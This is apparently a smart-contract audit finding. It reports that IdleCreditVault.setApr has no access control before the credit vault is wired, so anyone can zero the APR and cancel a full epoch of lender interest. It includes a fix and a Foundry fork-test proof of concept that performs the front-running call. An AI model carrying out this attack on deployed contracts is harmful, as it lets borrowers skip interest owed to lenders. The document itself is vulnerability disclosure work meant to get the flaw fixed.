### Title

Unauthenticated APR overwrite during credit-vault wiring causes permanent loss of lender yield - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary

`IdleCreditVault.setApr` permits any caller to overwrite `lastApr` while `idleCDO` is unset, including setting the borrower’s lending rate to zero. If the strategy is initialized before being wired to its credit vault, an unprivileged attacker can front-run `setWhitelistedCDO`, after which the first epoch records zero expected interest and the borrower is not charged for that epoch.

### Finding Description

`setApr` skips authorization entirely when `idleCDO == address(0)`, even though both `owner` and `manager` are already initialized and available for authentication. [1](#0-0) 

The intended production factory sequence configures the APR immediately before setting the CDO, which confirms that the zero-CDO branch exists only for setup rather than as a public APR-update path. [2](#0-1) 

An attacker can therefore execute `setApr(0)` between strategy initialization and `setWhitelistedCDO`. When the honest owner or manager subsequently calls `startEpoch`, the CDO calculates `expectedEpochInterest` from the corrupted strategy APR. [3](#0-2) 

At `stopEpoch`, `_amountToPullFromBorrower` is derived from that expected-interest value, so a zeroed APR means no borrower interest is pulled for the manipulated epoch. [4](#0-3) 

### Impact Explanation

For principal `P`, the entire configured first-epoch borrower interest is lost if the attacker sets `lastApr` to zero. The borrower retains funds that should have been paid to tranche holders, while tranche prices remain at principal value and the omitted yield cannot be recovered later by ordinary epoch accounting.

This is a permanent loss of earned yield rather than a temporary denial of service. The loss equals the full interest that `_calcInterest(P)` would otherwise have recorded in `expectedEpochInterest` for the manipulated epoch. [5](#0-4) 

### Likelihood Explanation

The attack requires a non-atomic deployment or migration sequence in which `IdleCreditVault.initialize` has executed but `setWhitelistedCDO` has not. Factory deployment avoids that window by performing both actions in one transaction, but the strategy itself exposes an unauthenticated state transition and does not enforce atomic or privileged setup. [6](#0-5) 

No malicious privileged role, forged approval, reentrancy, or borrower cooperation is required. The attacker only needs to observe the initialized strategy before the owner links the CDO and submit one public transaction.

### Recommendation

Authenticate `setApr` during bootstrap. A safe condition is:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
function setApr(uint256 _apr) public {
    address _cdo = idleCDO;
    if (_cdo != address(0)) {
        if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    } else if (msg.sender != owner() && msg.sender != manager) {
        revert NotAllowed();
    }
    // existing maxApr check and assignment
}
```

Preferably combine APR configuration and CDO wiring into one owner-only bootstrap function or require all deployments to use the existing atomic factory flow. [7](#0-6) 

### Proof of Concept

The following Foundry fork test models a deployed-but-not-yet-wired production strategy. `CREDIT_VAULT`, `STRATEGY`, `UNDERLYING`, and `LENDER` are supplied from the target deployment, with `LENDER` representing an allowed/KYC-passing depositor.

```solidity
// test/foundry/UnauthenticatedAprSetup.t.sol
function testUnauthenticatedSetupAprZeroesEpochYield() public {
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(CREDIT_VAULT);
    IdleCreditVault strategy = IdleCreditVault(STRATEGY);
    IERC20Detailed underlying = IERC20Detailed(UNDERLYING);

    require(strategy.idleCDO() == address(0), "setup window required");

    address attacker = makeAddr("attacker");
    vm.prank(attacker);
    strategy.setApr(0);

    assertEq(strategy.getApr(), 0, "attacker overwrote epoch APR");

    address strategyOwner = strategy.owner();
    vm.prank(strategyOwner);
    strategy.setWhitelistedCDO(address(cdo));

    uint256 principal = 100_000e6;
    deal(UNDERLYING, LENDER, principal);

    vm.startPrank(LENDER);
    underlying.approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    address cdoOperator = cdo.owner();
    vm.warp(cdo.epochEndDate() + cdo.bufferPeriod() + 1);

    vm.prank(cdoOperator);
    cdo.startEpoch();

    assertEq(
        cdo.expectedEpochInterest(),
        0,
        "manipulated epoch charges the borrower zero interest"
    );

    uint256 borrowerBefore = underlying.balanceOf(strategy.borrower());

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(IdleCreditVault(address(strategy)).manager());
    cdo.stopEpoch(0, 0);

    assertEq(
        underlying.balanceOf(strategy.borrower()),
        borrowerBefore,
        "borrower retained the manipulated epoch's yield"
    );
    assertEq(cdo.lastEpochInterest(), 0, "LP yield was permanently omitted");
}
```
